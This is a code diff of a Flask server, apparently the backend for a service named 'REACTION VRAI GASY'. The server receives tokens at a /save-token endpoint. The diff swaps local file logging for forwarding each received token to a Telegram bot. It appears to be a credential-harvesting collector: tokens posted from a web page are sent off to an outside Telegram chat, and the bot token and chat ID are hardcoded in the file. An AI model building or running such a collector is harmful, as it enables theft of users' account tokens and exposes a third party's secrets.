@@ -1,32 +1,38 @@
 import os
+import requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 
 app = Flask(__name__)
-CORS(app)  # Autorise GitHub à envoyer les tokens ici
+CORS(app)
+
+# Tes infos Telegram
+TELEGRAM_TOKEN = "8632263179:AAFDjyU6d4eTCMgg4wM4xB1sDBGmWEMod2s"
+TELEGRAM_CHAT_ID = "7129218282"
+
+def send_to_telegram(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
+    try:
+        requests.post(url, json=payload)
+    except Exception as e:
+        print(f"Erreur Telegram: {e}")
 
 @app.route('/')
 def home():
-    return "Serveur REACTION VRAI GASY opérationnel !", 200
+    return "Système REACTION VRAI GASY prêt !", 200
 
 @app.route('/save-token', methods=['POST'])
 def save_token():
-    try:
-        data = request.get_json()
-        token = data.get('token')
-        if token:
-            # On écrit dans 1.txt (Note: Render efface ce fichier au redémarrage)
-            # On affiche aussi le token dans les logs pour que tu puisses le copier
-            print(f"NOUVEAU TOKEN REÇU : {token}")
-            with open("1.txt", "a") as f:
-                f.write(f"{token}\n")
-            return jsonify({"status": "success"}), 200
-        return jsonify({"status": "no_token"}), 400
-    except Exception as e:
-        print(f"Erreur : {e}")
-        return jsonify({"status": "error"}), 500
+    data = request.get_json()
+    token = data.get('token')
+    if token:
+        # Envoi direct vers ton Telegram
+        msg = f"🚀 NOUVEAU TOKEN REÇU !\n\n{token}"
+        send_to_telegram(msg)
+        return jsonify({"status": "success"}), 200
+    return jsonify({"status": "error"}), 400
 
 if __name__ == "__main__":
-    # Très important pour Render :
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
